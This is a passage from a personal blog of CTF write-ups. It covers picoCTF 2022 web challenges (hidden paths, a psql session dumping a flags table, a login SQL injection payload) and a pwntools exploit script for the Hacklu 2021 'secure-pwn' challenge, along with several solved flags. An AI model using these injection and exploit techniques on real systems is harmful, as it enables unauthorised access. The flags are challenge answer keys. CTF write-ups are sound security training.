class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-twitter fa-fw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Login with Twitter</span><br><span class="line">              <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;google btn&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-google fa-fw&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Login with Google+</span><br><span class="line">              <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;hide-md-lg&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">p</span>&gt;</span>Or sign in manually:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">                <span class="attr">type</span>=<span class="string">&quot;text&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">name</span>=<span class="string">&quot;username&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">required</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">                <span class="attr">type</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">name</span>=<span class="string">&quot;password&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">required</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;db&quot;</span> <span class="attr">value</span>=<span class="string">&quot;superhidden/xdfgwd.html&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span></span></span><br><span class="line"><span class="tag">                <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Thank you for the attempt but oops! try harder. better luck next time&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag">              /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;bottom-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;row&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: white&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: white&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>Forgot password?<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>最后访问一下<code>http://saturn.picoctf.net:50167/secret/hidden/superhidden/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; href=&quot;mycss.css&quot; /&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Finally. You found me. But can you see me&lt;/h1&gt;</span><br><span class="line">    &lt;h3 class=&quot;flag&quot;&gt;picoCTF&#123;succ3ss_@h3n1c@10n_51b260fe&#125;&lt;/h3&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="SQL-Direct-web"><a href="#SQL-Direct-web" class="headerlink" title="SQL Direct-web"></a>SQL Direct-web</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">~ wsl@Conjuring</span><br><span class="line">&lt;2&gt;&gt;&gt; proxychains psql -h saturn.picoctf.net -p 53019 -U postgres pico</span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">[proxychains] Strict chain  ...  192.168.10.3:49010  ...  saturn.picoctf.net:53019  ...  OK</span><br><span class="line">Password for user postgres:</span><br><span class="line">[proxychains] Strict chain  ...  192.168.10.3:49010  ...  saturn.picoctf.net:53019  ...  OK</span><br><span class="line">psql (12.9 (Ubuntu 12.9-0ubuntu0.20.04.1), server 14.2 (Debian 14.2-1.pgdg110+1))</span><br><span class="line">WARNING: psql major version 12, server major version 14.</span><br><span class="line">         Some psql features might not work.</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">pico=# help</span><br><span class="line">You are using psql, the command-line interface to PostgreSQL.</span><br><span class="line">Type:  \copyright for distribution terms</span><br><span class="line">       \h for help with SQL commands</span><br><span class="line">       \? for help with psql commands</span><br><span class="line">       \g or terminate with semicolon to execute query</span><br><span class="line">       \q to quit</span><br><span class="line">pico=# \list</span><br><span class="line">                                 List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges</span><br><span class="line">-----------+----------+----------+------------+------------+-----------------------</span><br><span class="line"> pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line"> template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line">(4 rows)</span><br><span class="line">pico=# \list</span><br><span class="line">                                 List of databases</span><br><span class="line">   Name    |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges</span><br><span class="line">-----------+----------+----------+------------+------------+-----------------------</span><br><span class="line"> pico      | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> postgres  | postgres | UTF8     | en_US.utf8 | en_US.utf8 |</span><br><span class="line"> template0 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line"> template1 | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +</span><br><span class="line">           |          |          |            |            | postgres=CTc/postgres</span><br><span class="line">(4 rows)</span><br><span class="line"></span><br><span class="line">pico=# \d</span><br><span class="line">         List of relations</span><br><span class="line"> Schema | Name  | Type  |  Owner</span><br><span class="line">--------+-------+-------+----------</span><br><span class="line"> public | flags | table | postgres</span><br><span class="line">(1 row)</span><br><span class="line"></span><br><span class="line">pico=# select * from flags</span><br><span class="line">pico-# ;</span><br><span class="line"> id | firstname | lastname  |                address</span><br><span class="line">----+-----------+-----------+----------------------------------------</span><br><span class="line">  1 | Luke      | Skywalker | picoCTF&#123;L3arN_S0m3_5qL_t0d4Y_0414477f&#125;</span><br><span class="line">  2 | Leia      | Organa    | Alderaan</span><br><span class="line">  3 | Han       | Solo      | Corellia</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure>

<h2 id="sqlilite-web"><a href="#sqlilite-web" class="headerlink" title="sqlilite-web"></a>sqlilite-web</h2><p>输入错误的admin和password</p>
<p>提示：Login failed.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password: admin</span><br><span class="line">SQL query: SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>

<p>看到是通过sql查询的，应该可以sql注入</p>
<p>注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=&#x27;admin&#x27; AND password=&#x27;&#x27; or `1=`1`</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/04/09/2022picoctfctf/" data-id="cuidLuPQt13YhQ8KMt-yzTD-9" data-title="picoctf2022" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2021hackluctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/11/02/2021hackluctf/" class="article-date">
  <time class="dt-published" datetime="2021-11-02T03:07:10.000Z" itemprop="datePublished">2021-11-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/11/02/2021hackluctf/">Hacklu CTF 2021</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="secure-pwn"><a href="#secure-pwn" class="headerlink" title="secure-pwn"></a>secure-pwn</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># HOST,PORT = &quot;127.0.0.1&quot;,8888</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;flu.xxx&quot;</span>, <span class="number">20040</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># p = process(&#x27;qemu-arm -L /usr/arm-linux-gnueabi ./challenge.elf&#x27;, shell=True)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printf</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modify</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x420</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x1337</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    sl(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">0x9999</span>))</span><br><span class="line">    sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (a,b,c))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;you)\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x420</span>))</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3 parameters:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%d %d %d&#x27;</span> % (<span class="number">0x10570</span>,<span class="number">0x0</span>,<span class="number">0x0</span>))</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x1337</span>))</span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;3 parameters:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%d %d %d&#x27;</span> % (<span class="number">0x000111FC</span>,<span class="number">0x22058</span>,<span class="number">0x0</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">sl(<span class="string">&#x27;parameters:\n&#x27;</span>, <span class="string">&#x27;%d %d %d&#x27;</span> % (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;gl0bal_st0nkz_and_gl0bal_var1abl3&#125;</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/11/02/2021hackluctf/" data-id="cuid5AV_KChmNeFH3lPFdAuxH" data-title="Hacklu CTF 2021" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2025/11/19/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/cakectf2022/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/2025crewctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/19/2025%E7%9C%8B%E9%9B%AAkctf/">(no title)</a>
          </li>
        
          <li>
            <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2025 xrivendell7<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>